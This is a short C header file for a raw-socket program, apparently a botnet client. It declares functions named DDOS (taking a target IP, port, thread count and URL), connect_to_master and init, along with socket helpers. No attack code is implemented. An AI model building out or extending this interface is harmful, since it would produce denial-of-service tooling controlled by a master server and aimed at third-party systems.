#ifndef PACKET_HED

#define PACKET_HED

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>    //for socket ofcourse
#include <errno.h> //For errno - the error number
#include <netinet/tcp.h>   //Provides declarations for tcp header
#include <netinet/ip.h>    //Provides declarations for ip header
#include <netinet/in.h>
#include <arpa/inet.h>

#define ERROR -1

/* Ether Header struct -> ethhdr in  #include <linux/if_ether.h>
							h_dest : hardware destination
							h_source : hardware source
							h_proto : the protocol
 * IP Header struct    -> iphdr in #include <linux/ip.h>
 *
*/

int make_socket(void);
void wait_and_close(int f_write);
void DDOS(int type, char *target_ip, short port, int n_thrds, char *target_url);
void connect_to_master();
void init(char *to_con, int port);

#endif